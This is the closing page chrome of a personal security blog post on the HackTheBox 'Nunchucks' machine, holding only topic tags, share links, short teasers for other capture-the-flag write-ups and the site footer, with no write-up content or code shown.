class="post-tag no-text-decoration" >javascript</a> <a href="/tags/perl/" class="post-tag no-text-decoration" >perl</a> <a href="/tags/apparmor/" class="post-tag no-text-decoration" >apparmor</a> <a href="/tags/nunjucks/" class="post-tag no-text-decoration" >nunjucks</a> <a href="/tags/express/" class="post-tag no-text-decoration" >express</a> <a href="/tags/expressjs/" class="post-tag no-text-decoration" >expressjs</a> <a href="/tags/template/" class="post-tag no-text-decoration" >template</a> <a href="/tags/injection/" class="post-tag no-text-decoration" >injection</a> <a href="/tags/gtfobins/" class="post-tag no-text-decoration" >gtfobins</a> <a href="/tags/gtfo/" class="post-tag no-text-decoration" >gtfo</a> <a href="/tags/shebang/" class="post-tag no-text-decoration" >shebang</a> <a href="/tags/launchpad/" class="post-tag no-text-decoration" >launchpad</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox Nunchucks - amroot&url=https://am-root.github.io/posts/HTB-Nunchucks/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox Nunchucks - amroot&u=https://am-root.github.io/posts/HTB-Nunchucks/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://am-root.github.io/posts/HTB-Nunchucks/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Nunchucks/">HackTheBox Nunchucks</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/443/">443</a> <a class="post-tag" href="/tags/apache/">apache</a> <a class="post-tag" href="/tags/blackhat/">blackhat</a> <a class="post-tag" href="/tags/bypass/">bypass</a> <a class="post-tag" href="/tags/capability/">capability</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Seal/"><div class="card-body"> <span class="timeago small" >Nov 20, 2021<i class="unloaded">2021-11-20T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Seal</h3><div class="text-muted small"><p> Machine information Seal is very entertaining machine. First discovering Vhost of the machine and running ffuf against it showed few directories that were used in Apache Tomcat server. Another Ser...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Monitors/"><div class="card-body"> <span class="timeago small" >Oct 31, 2021<i class="unloaded">2021-10-31T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Monitors</h3><div class="text-muted small"><p> Machine Information Monitors is a hard difficulty machine that starts with a vulnerable RFI plugin on a WordPress site. I acquire information on different vHosts hosting vulnerable cactus after som...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Pikaboo/"><div class="card-body"> <span class="timeago small" >Dec 14, 2021<i class="unloaded">2021-12-14T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Pikaboo</h3><div class="text-muted small"><p> Machine Information Pikaboo is extremely fun box to solve. The box starts with enumeration on web server that is hosting nginx but later finding that Apache is running as well. Apache server can b...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-Monitors/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox Monitors</p></a> <a href="/posts/HTB-Seal/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox Seal</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/_amroot">Janak Khairmode</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/443/">443</a> <a class="post-tag" href="/tags/apache/">apache</a> <a class="post-tag" href="/tags/blackhat/">blackhat</a> <a class="post-tag" href="/tags/bypass/">bypass</a> <a class="post-tag" href="/tags/capability/">capability</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
